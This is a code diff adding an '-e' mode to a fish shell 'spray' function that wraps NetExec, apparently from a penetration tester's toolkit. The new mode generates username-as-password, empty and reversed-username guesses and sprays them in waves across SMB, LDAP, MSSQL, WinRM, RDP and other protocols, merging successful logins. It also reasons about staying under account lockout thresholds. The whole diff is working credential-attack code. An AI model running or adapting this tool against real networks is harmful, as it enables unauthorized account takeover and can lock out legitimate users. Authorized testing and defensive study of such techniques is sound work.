@@ -4,7 +4,7 @@ function spray --description "spray one or many credentials across every NetExec
         'p/pass=+' 'P/passlist=+' \
         'H/hash=+' 'F/hashlist=+' \
         'd/domain=' 'j/jitter=' \
-        'l/local' 'b/paired' 'L/live' 'n/dry' 'v/verbose' \
+        'l/local' 'b/paired' 'L/live' 'n/dry' 'v/verbose' 'e/easy' \
         -- $argv
     or return 1
 
@@ -20,10 +20,86 @@ function spray --description "spray one or many credentials across every NetExec
         echo "  -L live    credless smb sweep first, then spray only responders"
         echo "  -v verbose show every attempt on screen (default: only successes)"
         echo "  -n dry     print the plan and stop"
+        echo "  -e easy    no secret given: try username-as-password, empty, and reversed username"
         echo "  passwords hit every protocol; hashes only smb ldap mssql winrm wmi rdp"
         return 1
     end
     set -l target $argv[1]
+
+    # ---- -e: the three passwords every account has before it has one ----
+    # same / empty / reversed, one wave each, each wave a normal paired spray
+    # of this same function with generated lists. Nothing below this block
+    # changes for a -U -P run. Three secrets per user across the protocols is
+    # three bad-password counts per account: fine against any policy of 5+.
+    if set -q _flag_easy
+        if test (count $_flag_pass $_flag_passlist $_flag_hash $_flag_hashlist) -gt 0
+            echo "[!] -e builds its own passwords, drop -p/-P/-H/-F"
+            return 1
+        end
+        if test (count $_flag_user $_flag_userlist) -eq 0
+            echo "[!] -e needs users: -u USER and/or -U FILE"
+            return 1
+        end
+        for f in $_flag_userlist
+            test -r "$f"; or begin; echo "[!] list file not readable: $f"; return 1; end
+        end
+        set -l tsan (string replace -a / _ -- $target | string replace -a ' ' _)
+        set -l ulist "spray-e-$tsan.users"
+        set -l rlist "spray-e-$tsan.reversed"
+        begin
+            printf '%s\n' $_flag_user
+            for f in $_flag_userlist; cat $f; end
+        end | string trim | string match -rv '^$' | awk '!seen[$0]++' >$ulist
+        rev $ulist >$rlist
+        set -l n (count (cat $ulist))
+        test $n -gt 0; or begin; echo "[!] no users after cleaning"; return 1; end
+
+        # everything else the caller gave rides along unchanged
+        set -l pass_through
+        set -q _flag_domain;  and set -a pass_through -d $_flag_domain
+        set -q _flag_jitter;  and set -a pass_through -j $_flag_jitter
+        set -q _flag_local;   and set -a pass_through -l
+        set -q _flag_live;    and set -a pass_through -L
+        set -q _flag_dry;     and set -a pass_through -n
+        set -q _flag_verbose; and set -a pass_through -v
+
+        set -l C (set_color -o cyan); set -l N (set_color normal)
+        echo "$C── spray -e: $n users × {same, empty, reversed} ─────────$N"
+        echo "  users    $ulist     reversed  $rlist"
+        set -l nproto 9; set -q _flag_local; and set nproto 5
+        echo "  lockout  3 wrong passwords × $nproto protocols = up to "(math 3 x $nproto)" failed logons per account, all counted by the DC."
+        echo "           know the threshold first: nxc smb $target -u '' -p '' --pass-pol   (or spray -n to see the plan)"
+        set -l merged "spray-$tsan.hits"
+        set -l allhits
+        for name in same empty reversed
+            set -l args
+            switch $name
+                case same;     set args -U $ulist -P $ulist -b
+                case empty;    set args -U $ulist -p ''
+                case reversed; set args -U $ulist -P $rlist -b
+            end
+            echo
+            echo "$C── wave: $name ──$N"
+            spray $target $args $pass_through
+            # each wave wrote spray-TSAN.log/.hits: keep them apart
+            for ext in log hits
+                test -f "spray-$tsan.$ext"; and mv "spray-$tsan.$ext" "spray-$tsan-$name.$ext"
+            end
+            echo "  $name wave kept as spray-$tsan-$name.log / .hits"
+            test -s "spray-$tsan-$name.hits"; and set -a allhits "spray-$tsan-$name.hits"
+        end
+        set -q _flag_dry; and return 0
+        if test (count $allhits) -gt 0
+            cat $allhits | sort -u >$merged
+            echo
+            echo "$C── -e total: "(wc -l <$merged | string trim)" hit(s) merged -> $merged ──$N"
+            cat $merged | sed 's/^/  /'
+        else
+            echo
+            echo "[*] -e: nothing across same/empty/reversed. Logs: spray-$tsan-{same,empty,reversed}.log"
+        end
+        return 0
+    end
 
     # ---- gather credential sources ---------------------------------------
     # nxc takes many values after one flag and auto-detects file-vs-literal,
